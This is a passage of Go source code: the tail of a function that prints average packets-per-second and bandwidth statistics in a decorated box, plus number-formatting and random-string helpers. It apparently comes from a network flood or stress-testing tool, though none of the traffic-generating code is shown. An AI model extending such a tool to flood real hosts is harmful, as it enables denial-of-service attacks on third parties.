    fmt.Printf("║  ⚡ AVERAGE PPS:         %-30s                    ║\n", formatNumber(int64(avgPPS)))
    fmt.Printf("║  🌐 AVERAGE MBPS:        %.1f MBps                                          ║\n", avgMBPS)
    fmt.Printf("║  💀 AVERAGE GBPS:        %.2f Gbps                                           ║\n", avgMBPS/1000)
    fmt.Printf("║                                                                                                  ║\n")
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNumber(n int64) string {
    if n < 1000 {
        return fmt.Sprintf("%d", n)
    }
    if n < 1000000 {
        return fmt.Sprintf("%.1fK", float64(n)/1000)
    }
    if n < 1000000000 {
        return fmt.Sprintf("%.1fM", float64(n)/1000000)
    }
    if n < 1000000000000 {
        return fmt.Sprintf("%.1fB", float64(n)/1000000000)
    }
    return fmt.Sprintf("%.1fT", float64(n)/1000000000000)
}

func randomString(length int) string {
    chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}